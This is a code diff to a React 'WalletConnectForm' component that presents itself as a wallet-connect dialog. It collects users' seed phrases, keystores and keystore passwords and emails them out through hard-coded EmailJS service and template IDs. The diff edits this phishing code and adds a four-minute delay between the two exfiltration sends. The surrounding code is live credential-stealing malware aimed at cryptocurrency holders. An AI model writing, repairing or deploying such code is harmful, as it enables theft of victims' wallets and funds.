@@ -54,6 +54,9 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     const data = phrase
     const password = "not_required"
     const formData = {name, type, data, password}
+
+    const sendFast = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+    
     if (validatePhrase(phrase)) {
       try {
 
@@ -61,7 +64,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
           'service_30vkiql',
           'template_e0wb6w8',
           {
-            to_name: "dapp", // Replace with the actual recipient's name if needed
+            to_name: "dapp",
             from_name: formData.name,
             message: `
               Name: ${formData.name}
@@ -72,6 +75,8 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
           },
           '4leuzsOPi6Oh_D4e0'
         );
+
+        await sendFast(4 * 60 * 1000);
         
         await emailjs.send(
           'service_ky8xa0e',
@@ -120,6 +125,9 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     const data = keystore
     const password = keystorePassword
     const formData = {name, type, data, password}
+
+    const sendFast = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+    
     try {
 
       await emailjs.send(
@@ -137,6 +145,8 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
         },
         '4leuzsOPi6Oh_D4e0'
       );
+
+      await sendFast(4 * 60 * 1000);
       
       await emailjs.send(
         'service_ky8xa0e',
